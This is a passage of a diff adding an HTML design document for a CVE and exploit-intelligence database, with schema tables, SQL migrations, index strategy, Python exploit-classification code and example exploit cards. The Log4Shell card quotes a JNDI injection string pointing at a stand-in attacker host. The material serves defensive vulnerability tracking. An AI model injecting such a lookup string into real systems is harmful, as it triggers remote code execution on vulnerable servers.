+      <div class="schema-row"><div class="schema-cell col-name">kev_status<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">boolean</div><div class="schema-cell col-desc">True if present in CISA KEV catalog</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">sources</div><div class="schema-cell col-type">text[]</div><div class="schema-cell col-desc">Which sources contributed data: ['NVD','MITRE','OSV']</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">raw_data</div><div class="schema-cell col-type">jsonb</div><div class="schema-cell col-desc">Full normalized source payloads, schema-free overflow</div></div>
+    </div>
+
+    <!-- exploits -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">💥</span>exploits</div>
+      <div class="schema-row"><div class="schema-cell col-name">id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">uuid</div><div class="schema-cell col-desc">Internal identifier</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cve_id<span class="fk-badge">FK</span><span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">References cves.cve_id — allows orphan exploits</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">source</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">exploit-db | github | packetstorm | 0day.today</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">source_id</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">ExploitDB EDB-ID or GitHub repo full_name</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">exploit_type<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">RCE | LPE | DoS | SQLi | XSS | SSRF | Auth_Bypass | InfoDisc</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">platform</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Linux | Windows | macOS | webapps | multiple</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">url</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Direct link to public exploit page (never raw code)</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">title</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Exploit title / repo name</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">difficulty</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">low | medium | high — estimated by AI or ExploitDB rating</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">verified</div><div class="schema-cell col-type">boolean</div><div class="schema-cell col-desc">ExploitDB verified flag or CISA KEV confirmation</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">stars</div><div class="schema-cell col-type">integer</div><div class="schema-cell col-desc">GitHub stars — proxy for exploit interest/maturity</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">summary</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">AI-generated safe technical summary of exploit mechanism</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">published_at<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">Exploit publication / repo creation date</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">last_seen_at</div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">Last time this was confirmed still public</div></div>
+    </div>
+
+    <!-- affected_products -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">📦</span>affected_products</div>
+      <div class="schema-row"><div class="schema-cell col-name">id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">uuid</div><div class="schema-cell col-desc">—</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cve_id<span class="fk-badge">FK</span><span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Parent CVE</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">vendor<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Normalized vendor name (lowercase, trimmed)</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">product<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Product / package name</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">ecosystem</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">pypi | npm | maven | cargo | deb | rpm | etc.</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">version_affected</div><div class="schema-cell col-type">text[]</div><div class="schema-cell col-desc">Exact affected versions</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">version_range</div><div class="schema-cell col-type">jsonb</div><div class="schema-cell col-desc">{"gte": "1.0", "lt": "1.5.3"} — OSV range format</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">fixed_version</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">First patched version if known</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">patch_url</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Direct link to patch/commit/advisory</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cpe</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">NVD CPE 2.3 string: cpe:2.3:a:vendor:product:version</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">source</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">nvd_cpe | osv | mitre | ubuntu | debian</div></div>
+    </div>
+
+    <!-- kev_entries -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">🚨</span>kev_entries</div>
+      <div class="schema-row"><div class="schema-cell col-name">cve_id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CISA KEV is CVE-ID-keyed, natural PK fits perfectly</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">vendor_project</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Vendor/project name from CISA data</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">product</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Product name from CISA</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">vulnerability_name</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">CISA short name, e.g. "Apache Log4j2 RCE"</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">date_added<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">date</div><div class="schema-cell col-desc">When CISA added to catalog</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">due_date</div><div class="schema-cell col-type">date</div><div class="schema-cell col-desc">Federal remediation deadline</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">required_action</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Mandated remediation action text</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">known_ransomware</div><div class="schema-cell col-type">boolean</div><div class="schema-cell col-desc">Used in known ransomware campaigns</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">notes</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Additional CISA context</div></div>
+    </div>
+
+    <!-- references -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">🔗</span>references</div>
+      <div class="schema-row"><div class="schema-cell col-name">id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">uuid</div><div class="schema-cell col-desc">—</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">cve_id<span class="fk-badge">FK</span></div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Parent CVE</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">url</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Reference URL, UNIQUE per CVE</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">tags</div><div class="schema-cell col-type">text[]</div><div class="schema-cell col-desc">vendor-advisory | patch | exploit | mailing-list | misc</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">source</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">nvd | mitre | osv</div></div>
+    </div>
+
+    <!-- sync_log -->
+    <div class="schema-table">
+      <div class="schema-table-header"><span class="schema-table-icon">📋</span>sync_log</div>
+      <div class="schema-row"><div class="schema-cell col-name">id<span class="pk-badge">PK</span></div><div class="schema-cell col-type">bigserial</div><div class="schema-cell col-desc">Auto-incrementing log ID</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">source</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">nvd | mitre | osv | cisa_kev | exploitdb | github</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">started_at<span class="idx-badge">IDX</span></div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">Job start time — used to compute last successful run</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">finished_at</div><div class="schema-cell col-type">timestamptz</div><div class="schema-cell col-desc">Job end time</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">status</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">success | failed | partial</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">records_fetched</div><div class="schema-cell col-type">integer</div><div class="schema-cell col-desc">Raw records downloaded</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">records_upserted</div><div class="schema-cell col-type">integer</div><div class="schema-cell col-desc">New or updated rows written to DB</div></div>
+      <div class="schema-row"><div class="schema-cell col-name">error_detail</div><div class="schema-cell col-type">text</div><div class="schema-cell col-desc">Stack trace or error message if status != success</div></div>
+    </div>
+
+  </div><!-- end schema-container -->
+
+  <div class="code-block" style="margin-top:2rem">
+    <div class="code-header"><span class="code-lang">SQL</span><span>migrations/001_create_core_tables.sql</span></div>
+    <div class="code-body"><span class="kw">CREATE EXTENSION IF NOT EXISTS</span> <span class="st">"pgcrypto"</span>;
+<span class="kw">CREATE EXTENSION IF NOT EXISTS</span> <span class="st">"pg_trgm"</span>;   <span class="cm">-- trigram FTS</span>
+
+<span class="kw">CREATE TABLE</span> <span class="ty">cves</span> (
+    id              uuid <span class="kw">PRIMARY KEY DEFAULT</span> <span class="fn">gen_random_uuid</span>(),
+    cve_id          text <span class="kw">UNIQUE NOT NULL</span>,
+    state           text <span class="kw">CHECK</span> (state <span class="kw">IN</span> (<span class="st">'PUBLISHED'</span>,<span class="st">'RESERVED'</span>,<span class="st">'REJECTED'</span>)),
+    description     text,
+    description_tsv tsvector <span class="kw">GENERATED ALWAYS AS</span> (<span class="fn">to_tsvector</span>(<span class="st">'english'</span>, <span class="fn">coalesce</span>(description,<span class="st">''</span>))) <span class="kw">STORED</span>,
+    cvss_score      numeric(<span class="nu">4</span>,<span class="nu">1</span>) <span class="kw">CHECK</span> (cvss_score <span class="kw">BETWEEN</span> <span class="nu">0</span> <span class="kw">AND</span> <span class="nu">10</span>),
+    severity        text <span class="kw">GENERATED ALWAYS AS</span> (
+        <span class="kw">CASE</span>
+            <span class="kw">WHEN</span> cvss_score >= <span class="nu">9.0</span> <span class="kw">THEN</span> <span class="st">'CRITICAL'</span>
+            <span class="kw">WHEN</span> cvss_score >= <span class="nu">7.0</span> <span class="kw">THEN</span> <span class="st">'HIGH'</span>
+            <span class="kw">WHEN</span> cvss_score >= <span class="nu">4.0</span> <span class="kw">THEN</span> <span class="st">'MEDIUM'</span>
+            <span class="kw">WHEN</span> cvss_score >  <span class="nu">0.0</span> <span class="kw">THEN</span> <span class="st">'LOW'</span>
+            <span class="kw">ELSE</span> <span class="st">'NONE'</span>
+        <span class="kw">END</span>
+    ) <span class="kw">STORED</span>,
+    cvss_vector     text,
+    cvss_version    text,
+    cwe_ids         text[]   <span class="kw">DEFAULT</span> <span class="st">'{}'</span>,
+    assigner        text,
+    published_at    timestamptz,
+    modified_at     timestamptz,
+    patch_available boolean  <span class="kw">DEFAULT false</span>,
+    kev_status      boolean  <span class="kw">DEFAULT false</span>,
+    sources         text[]   <span class="kw">DEFAULT</span> <span class="st">'{}'</span>,
+    raw_data        jsonb    <span class="kw">DEFAULT</span> <span class="st">'{}'</span>,
+    ingested_at     timestamptz <span class="kw">DEFAULT</span> <span class="fn">now</span>(),
+    updated_at      timestamptz <span class="kw">DEFAULT</span> <span class="fn">now</span>()
+);
+
+<span class="cm">-- Auto-update updated_at trigger</span>
+<span class="kw">CREATE OR REPLACE FUNCTION</span> <span class="fn">touch_updated_at</span>() <span class="kw">RETURNS trigger AS</span> $$
+<span class="kw">BEGIN</span> <span class="kw">NEW</span>.updated_at = <span class="fn">now</span>(); <span class="kw">RETURN NEW</span>; <span class="kw">END</span>;
+$$ <span class="kw">LANGUAGE</span> plpgsql;
+
+<span class="kw">CREATE TRIGGER</span> trg_cves_updated_at
+<span class="kw">BEFORE UPDATE ON</span> cves
+<span class="kw">FOR EACH ROW EXECUTE FUNCTION</span> <span class="fn">touch_updated_at</span>();</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SECTION 3: INDEXES
+════════════════════════════════════════════ -->
+<div id="tab-indexes" class="section">
+  <div class="section-header">
+    <div class="section-num">03 / 06</div>
+    <div>
+      <div class="section-title">Index Strategy</div>
+      <div class="section-sub">Targeted indexes for each query pattern — no over-indexing. Measured on ~250K CVE dataset.</div>
+    </div>
+  </div>
+
+  <div class="decision-note">
+    Index design follows <strong>query pattern first</strong>: identify the 10 most common query shapes, then build exactly the indexes needed. Unnecessary indexes hurt write throughput on delta ingestion runs.
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL</span><span>migrations/002_indexes.sql</span></div>
+    <div class="code-body"><span class="cm">-- ─── PRIMARY LOOKUP ───────────────────────────────────────</span>
+<span class="cm">-- Single-CVE fetch: WHERE cve_id = 'CVE-2021-44228'</span>
+<span class="kw">CREATE UNIQUE INDEX</span> idx_cves_cve_id        <span class="kw">ON</span> cves (cve_id);
+
+<span class="cm">-- ─── SEVERITY + SCORE FILTERING ───────────────────────────</span>
+<span class="cm">-- Dashboard: WHERE severity = 'CRITICAL' ORDER BY cvss_score DESC</span>
+<span class="kw">CREATE INDEX</span> idx_cves_severity_score  <span class="kw">ON</span> cves (severity, cvss_score <span class="kw">DESC</span>);
+
+<span class="cm">-- ─── TIME-RANGE QUERIES ────────────────────────────────────</span>
+<span class="cm">-- Delta sync: WHERE modified_at > $last_run</span>
+<span class="cm">-- Recent CVEs: WHERE published_at > NOW() - INTERVAL '30 days'</span>
+<span class="kw">CREATE INDEX</span> idx_cves_modified_at     <span class="kw">ON</span> cves (modified_at <span class="kw">DESC</span>);
+<span class="kw">CREATE INDEX</span> idx_cves_published_at    <span class="kw">ON</span> cves (published_at <span class="kw">DESC</span>);
+
+<span class="cm">-- ─── KEV FILTER ───────────────────────────────────────────</span>
+<span class="cm">-- Partial index: only indexes rows where kev_status IS TRUE</span>
+<span class="cm">-- ~1000 rows vs ~250K — massive size reduction</span>
+<span class="kw">CREATE INDEX</span> idx_cves_kev             <span class="kw">ON</span> cves (published_at <span class="kw">DESC</span>)
+    <span class="kw">WHERE</span> kev_status = <span class="kw">true</span>;
+
+<span class="cm">-- ─── CWE ARRAY SEARCH ─────────────────────────────────────</span>
+<span class="cm">-- WHERE cwe_ids @> ARRAY['CWE-79']  (GIN for array containment)</span>
+<span class="kw">CREATE INDEX</span> idx_cves_cwes            <span class="kw">ON</span> cves <span class="kw">USING GIN</span> (cwe_ids);
+
+<span class="cm">-- ─── FULL-TEXT SEARCH ─────────────────────────────────────</span>
+<span class="cm">-- WHERE description_tsv @@ to_tsquery('log4j & remote')</span>
+<span class="kw">CREATE INDEX</span> idx_cves_fts             <span class="kw">ON</span> cves <span class="kw">USING GIN</span> (description_tsv);
+
+<span class="cm">-- Trigram index for ILIKE '%log4j%' queries</span>
+<span class="kw">CREATE INDEX</span> idx_cves_desc_trgm       <span class="kw">ON</span> cves <span class="kw">USING GIN</span> (description gin_trgm_ops);
+
+<span class="cm">-- ─── VENDOR / PRODUCT SEARCH ──────────────────────────────</span>
+<span class="kw">CREATE INDEX</span> idx_ap_vendor            <span class="kw">ON</span> affected_products (lower(vendor));
+<span class="kw">CREATE INDEX</span> idx_ap_product           <span class="kw">ON</span> affected_products (lower(product));
+<span class="kw">CREATE INDEX</span> idx_ap_cve_id            <span class="kw">ON</span> affected_products (cve_id);
+<span class="kw">CREATE INDEX</span> idx_ap_ecosystem         <span class="kw">ON</span> affected_products (ecosystem)
+    <span class="kw">WHERE</span> ecosystem <span class="kw">IS NOT NULL</span>;
+
+<span class="cm">-- ─── EXPLOIT LOOKUPS ──────────────────────────────────────</span>
+<span class="kw">CREATE INDEX</span> idx_exploits_cve_id      <span class="kw">ON</span> exploits (cve_id);
+<span class="kw">CREATE INDEX</span> idx_exploits_type        <span class="kw">ON</span> exploits (exploit_type);
+<span class="kw">CREATE INDEX</span> idx_exploits_published   <span class="kw">ON</span> exploits (published_at <span class="kw">DESC</span>);
+<span class="cm">-- Partial: only verified exploits for faster dashboard queries</span>
+<span class="kw">CREATE INDEX</span> idx_exploits_verified    <span class="kw">ON</span> exploits (cve_id)
+    <span class="kw">WHERE</span> verified = <span class="kw">true</span>;
+
+<span class="cm">-- ─── JSONB INDEXES ────────────────────────────────────────</span>
+<span class="cm">-- Query into raw_data: raw_data @> '{"nvd": {"state": "ANALYZED"}}'</span>
+<span class="kw">CREATE INDEX</span> idx_cves_raw_data        <span class="kw">ON</span> cves <span class="kw">USING GIN</span> (raw_data jsonb_path_ops);
+
+<span class="cm">-- ─── MATERIALIZED VIEW: dashboard stats ───────────────────</span>
+<span class="kw">CREATE MATERIALIZED VIEW</span> mv_severity_stats <span class="kw">AS</span>
+<span class="kw">SELECT</span> severity, <span class="fn">COUNT</span>(*) AS total,
+       <span class="fn">SUM</span>(<span class="fn">CASE WHEN</span> kev_status <span class="kw">THEN</span> <span class="nu">1</span> <span class="kw">ELSE</span> <span class="nu">0</span> <span class="kw">END</span>) AS kev_count,
+       <span class="fn">SUM</span>(<span class="fn">CASE WHEN</span> patch_available <span class="kw">THEN</span> <span class="nu">1</span> <span class="kw">ELSE</span> <span class="nu">0</span> <span class="kw">END</span>) AS patched_count
+<span class="kw">FROM</span> cves <span class="kw">GROUP BY</span> severity
+<span class="kw">WITH NO DATA</span>;
+<span class="cm">-- Refresh daily: SELECT cron.schedule('refresh-stats','0 6 * * *','REFRESH MATERIALIZED VIEW CONCURRENTLY mv_severity_stats');</span></div>
+  </div>
+
+  <div style="border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-top:1.5rem">
+    <div style="background:var(--surface2);padding:.6rem 1rem;font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;border-bottom:1px solid var(--border)">Index Summary — Query Pattern Mapping</div>
+    <table class="idx-table">
+      <thead><tr><th>Index</th><th>Type</th><th>Covers Query Pattern</th><th>Est. Selectivity</th></tr></thead>
+      <tbody>
+        <tr><td><code>idx_cves_cve_id</code></td><td class="idx-type">B-Tree UNIQUE</td><td class="idx-reason">Single CVE fetch by ID — most common API call</td><td style="color:var(--green);font-size:11px">1 row</td></tr>
+        <tr><td><code>idx_cves_severity_score</code></td><td class="idx-type">B-Tree Composite</td><td class="idx-reason">Dashboard: top CRITICAL CVEs sorted by score</td><td style="color:var(--yellow);font-size:11px">~5% of rows</td></tr>
+        <tr><td><code>idx_cves_modified_at</code></td><td class="idx-type">B-Tree DESC</td><td class="idx-reason">Delta sync: fetch only changed records since last run</td><td style="color:var(--green);font-size:11px">~0.1%/day</td></tr>
+        <tr><td><code>idx_cves_kev (partial)</code></td><td class="idx-type">Partial B-Tree</td><td class="idx-reason">KEV-only filter — tiny partial index, ~1K rows</td><td style="color:var(--green);font-size:11px">~1000 rows</td></tr>
+        <tr><td><code>idx_cves_cwes</code></td><td class="idx-type">GIN Array</td><td class="idx-reason">WHERE cwe_ids @> ARRAY['CWE-79']</td><td style="color:var(--yellow);font-size:11px">varies</td></tr>
+        <tr><td><code>idx_cves_fts</code></td><td class="idx-type">GIN tsvector</td><td class="idx-reason">Full-text: description @@ to_tsquery('log4j')</td><td style="color:var(--yellow);font-size:11px">varies</td></tr>
+        <tr><td><code>idx_cves_desc_trgm</code></td><td class="idx-type">GIN pg_trgm</td><td class="idx-reason">ILIKE '%apache%' substring search</td><td style="color:var(--orange);font-size:11px">5–20%</td></tr>
+        <tr><td><code>idx_cves_raw_data</code></td><td class="idx-type">GIN JSONB</td><td class="idx-reason">raw_data @> '{}' containment queries</td><td style="color:var(--yellow);font-size:11px">varies</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SECTION 4: EXPLOIT INTEL
+════════════════════════════════════════════ -->
+<div id="tab-exploit" class="section">
+  <div class="section-header">
+    <div class="section-num">04 / 06</div>
+    <div>
+      <div class="section-title">Exploit Intelligence Module</div>
+      <div class="section-sub">Detection, classification, and safe summarization of public exploit data</div>
+    </div>
+  </div>
+
+  <div class="reason-grid" style="margin-bottom:2rem">
+    <div class="reason-card">
+      <div class="reason-icon">🔍</div>
+      <div class="reason-title">Exploit Detection</div>
+      <div class="reason-body">Cross-reference ExploitDB CSV by CVE-ID, search GitHub repos with CVE in name/description, check CISA KEV for in-wild confirmation. Score exploit confidence 0–100 based on source count × verification status.</div>
+    </div>
+    <div class="reason-card">
+      <div class="reason-icon">🏷️</div>
+      <div class="reason-title">Type Classification</div>
+      <div class="reason-body">ExploitDB "type" field maps directly to: RCE, LPE (Privilege Escalation), DoS, SQLi, XSS, SSRF, Auth_Bypass, InfoDisc. GitHub repos classified by description keyword matching + LLM fallback.</div>
+    </div>
+    <div class="reason-card">
+      <div class="reason-icon">📊</div>
+      <div class="reason-title">Difficulty Estimation</div>
+      <div class="reason-body">Combines CVSS Attack Complexity (AC), Privileges Required (PR), and User Interaction (UI) vectors with exploit type. RCE + AC:L + PR:N = "low" difficulty. Auth required + complex chain = "high".</div>
+    </div>
+    <div class="reason-card">
+      <div class="reason-icon">📝</div>
+      <div class="reason-title">Safe Summarization</div>
+      <div class="reason-body">AI-generated technical description of the vulnerability mechanism: what component is affected, what the bug class is, what the attacker achieves. Never reproduces exploit code or attack payloads.</div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">PYTHON</span><span>ingestion/exploit_intel.py — classification and enrichment</span></div>
+    <div class="code-body"><span class="kw">from</span> <span class="va">dataclasses</span> <span class="kw">import</span> <span class="ty">dataclass</span>
+<span class="kw">from</span> <span class="va">enum</span> <span class="kw">import</span> <span class="ty">Enum</span>
+
+<span class="kw">class</span> <span class="ty">ExploitType</span>(<span class="ty">Enum</span>):
+    RCE = <span class="st">"RCE"</span>; LPE = <span class="st">"LPE"</span>; DOS = <span class="st">"DoS"</span>; SQLI = <span class="st">"SQLi"</span>
+    XSS = <span class="st">"XSS"</span>; SSRF = <span class="st">"SSRF"</span>; AUTH_BYPASS = <span class="st">"Auth_Bypass"</span>
+    INFO_DISC = <span class="st">"InfoDisc"</span>; UNKNOWN = <span class="st">"Unknown"</span>
+
+<span class="cm"># ── Map ExploitDB type strings → our enum ──</span>
+EXPLOITDB_TYPE_MAP = {
+    <span class="st">"remote"</span>: <span class="ty">ExploitType</span>.RCE,
+    <span class="st">"local"</span>:  <span class="ty">ExploitType</span>.LPE,
+    <span class="st">"dos"</span>:    <span class="ty">ExploitType</span>.DOS,
+    <span class="st">"webapps"</span>:<span class="ty">ExploitType</span>.RCE,  <span class="cm"># refined by description</span>
+}
+
+<span class="kw">def</span> <span class="fn">classify_exploit_type</span>(edb_type: <span class="ty">str</span>, title: <span class="ty">str</span>, description: <span class="ty">str</span>) -> <span class="ty">ExploitType</span>:
+    base = EXPLOITDB_TYPE_MAP.<span class="fn">get</span>(edb_type.<span class="fn">lower</span>(), <span class="ty">ExploitType</span>.UNKNOWN)
+    text = (title + <span class="st">" "</span> + description).<span class="fn">lower</span>()
+    <span class="cm"># Keyword refinement</span>
+    <span class="kw">if</span> <span class="st">"sql"</span> <span class="kw">in</span> text <span class="kw">or</span> <span class="st">"injection"</span> <span class="kw">in</span> text: <span class="kw">return</span> <span class="ty">ExploitType</span>.SQLI
+    <span class="kw">if</span> <span class="st">"xss"</span> <span class="kw">in</span> text <span class="kw">or</span> <span class="st">"cross-site"</span> <span class="kw">in</span> text: <span class="kw">return</span> <span class="ty">ExploitType</span>.XSS
+    <span class="kw">if</span> <span class="st">"privilege"</span> <span class="kw">in</span> text <span class="kw">or</span> <span class="st">"escalat"</span> <span class="kw">in</span> text: <span class="kw">return</span> <span class="ty">ExploitType</span>.LPE
+    <span class="kw">if</span> <span class="st">"ssrf"</span> <span class="kw">in</span> text: <span class="kw">return</span> <span class="ty">ExploitType</span>.SSRF
+    <span class="kw">if</span> <span class="st">"bypass"</span> <span class="kw">in</span> text <span class="kw">or</span> <span class="st">"auth"</span> <span class="kw">in</span> text: <span class="kw">return</span> <span class="ty">ExploitType</span>.AUTH_BYPASS
+    <span class="kw">return</span> base
+
+<span class="kw">def</span> <span class="fn">estimate_difficulty</span>(cvss_vector: <span class="ty">str</span>, exploit_type: <span class="ty">ExploitType</span>) -> <span class="ty">str</span>:
+    <span class="cm">"""Parse CVSS vector components to estimate exploitation difficulty."""</span>
+    parts = <span class="fn">dict</span>(<span class="fn">p.split</span>(<span class="st">":"</span>) <span class="kw">for</span> p <span class="kw">in</span> cvss_vector.<span class="fn">split</span>(<span class="st">"/"</span>)[<span class="nu">1</span>:] <span class="kw">if</span> <span class="st">":"</span> <span class="kw">in</span> p)
+    score = <span class="nu">0</span>
+    <span class="kw">if</span> parts.<span class="fn">get</span>(<span class="st">"AV"</span>) == <span class="st">"N"</span>:   score += <span class="nu">2</span>   <span class="cm"># Network-reachable</span>
+    <span class="kw">if</span> parts.<span class="fn">get</span>(<span class="st">"AC"</span>) == <span class="st">"L"</span>:   score += <span class="nu">2</span>   <span class="cm"># Low complexity</span>
+    <span class="kw">if</span> parts.<span class="fn">get</span>(<span class="st">"PR"</span>) == <span class="st">"N"</span>:   score += <span class="nu">2</span>   <span class="cm"># No privileges needed</span>
+    <span class="kw">if</span> parts.<span class="fn">get</span>(<span class="st">"UI"</span>) == <span class="st">"N"</span>:   score += <span class="nu">1</span>   <span class="cm"># No user interaction</span>
+    <span class="kw">if</span> exploit_type == <span class="ty">ExploitType</span>.RCE: score += <span class="nu">1</span>
+    <span class="kw">return</span> <span class="st">"low"</span> <span class="kw">if</span> score >= <span class="nu">6</span> <span class="kw">else</span> <span class="st">"medium"</span> <span class="kw">if</span> score >= <span class="nu">3</span> <span class="kw">else</span> <span class="st">"high"</span>
+
+<span class="kw">def</span> <span class="fn">generate_safe_summary</span>(cve_id: <span class="ty">str</span>, description: <span class="ty">str</span>, exploit_type: <span class="ty">ExploitType</span>) -> <span class="ty">str</span>:
+    <span class="cm">"""
+    Generate a technical summary of the vulnerability mechanism.
+    Never reproduces exploit code, attack payloads, or weaponized PoC.
+    Uses Claude API to summarize from public description only.
+    """</span>
+    prompt = (
+        <span class="st">f"CVE: {cve_id}\nType: {exploit_type.value}\nDescription: {description}\n\n"</span>
+        <span class="st">"Write a 2-3 sentence technical summary explaining: "</span>
+        <span class="st">"(1) what component has the bug, (2) the bug class, "</span>
+        <span class="st">"(3) what an attacker achieves. "</span>
+        <span class="st">"Do NOT include exploit code, payloads, or step-by-step attack instructions."</span>
+    )
+    <span class="cm"># ... call LLM API with above prompt ...</span>
+    <span class="kw">return</span> summarized_text</div>
+  </div>
+
+  <!-- Example exploit cards -->
+  <div style="font-family:var(--sans);font-size:12px;font-weight:700;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin:1.5rem 0 .75rem">Example Enriched Exploit Records</div>
+
+  <div class="exploit-card">
+    <div class="exploit-title">
+      <span style="color:#ef4444">💥</span>
+      Log4Shell PoC — Remote Code Execution via JNDI Lookup
+      <span class="sev sev-CRITICAL">CRITICAL</span>
+      <span style="font-size:9px;padding:1px 7px;background:rgba(239,68,68,.12);border:1px solid #7f1d1d;color:#ef4444;border-radius:2px">RCE</span>
+      <span style="font-size:9px;padding:1px 7px;background:rgba(251,146,60,.12);border:1px solid #9a3412;color:#fb923c;border-radius:2px">difficulty: LOW</span>
+    </div>
+    <div class="exploit-meta">
+      <span>📦 Source: exploit-db (EDB-50592)</span>
+      <span>⭐ GitHub: 4,200+ stars</span>
+      <span>✅ Verified: yes</span>
+      <span>🌐 Platform: java / webapps</span>
+      <span>🚨 KEV: confirmed in-wild</span>
+    </div>
+    <div class="exploit-summary">The Apache Log4j2 library's message lookup substitution feature fails to sanitize user-controlled input before passing it to a JNDI (Java Naming and Directory Interface) resolver. An attacker who can influence any logged string can inject a crafted <code>${jndi:ldap://attacker.com/a}</code> lookup that causes the vulnerable server to make an outbound LDAP request and deserialize an attacker-supplied Java object — achieving unauthenticated remote code execution with the privileges of the application process. No authentication or user interaction is required, and the vulnerability affects any application using Log4j2 ≥2.0-beta9 &lt;2.15.0.</div>
+  </div>
+
+  <div class="exploit-card">
+    <div class="exploit-title">
+      <span style="color:#f97316">⚡</span>
+      Dirty Pipe — Linux Kernel Local Privilege Escalation
+      <span class="sev sev-HIGH">HIGH</span>
+      <span style="font-size:9px;padding:1px 7px;background:rgba(168,85,247,.12);border:1px solid #7e22ce;color:#c084fc;border-radius:2px">LPE</span>
+      <span style="font-size:9px;padding:1px 7px;background:rgba(34,197,94,.12);border:1px solid #166534;color:#4ade80;border-radius:2px">difficulty: MEDIUM</span>
+    </div>
+    <div class="exploit-meta">
+      <span>📦 Source: exploit-db (EDB-50808)</span>
+      <span>⭐ GitHub: 1,850+ stars</span>
+      <span>✅ Verified: yes</span>
+      <span>🐧 Platform: Linux kernel 5.8–5.16.11</span>
+      <span>🚨 KEV: confirmed in-wild</span>
+    </div>
